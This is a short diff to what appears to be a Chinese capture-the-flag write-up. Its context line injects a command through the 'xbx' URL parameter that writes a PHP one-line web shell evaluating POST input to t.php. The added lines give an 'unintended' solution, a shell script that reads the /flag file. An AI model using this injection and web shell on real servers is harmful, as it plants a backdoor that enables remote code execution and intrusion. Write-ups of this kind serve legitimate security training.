@@ -28,4 +28,12 @@
 /?xbx=echo "<?php eval(\$_POST['t']);" > t.php
 ```
 
+非预期，shell脚本读
+```
+#!/bin/sh
+while read LINE; do
+echo $LINE
+done < /flag
+```
+
 ## flag
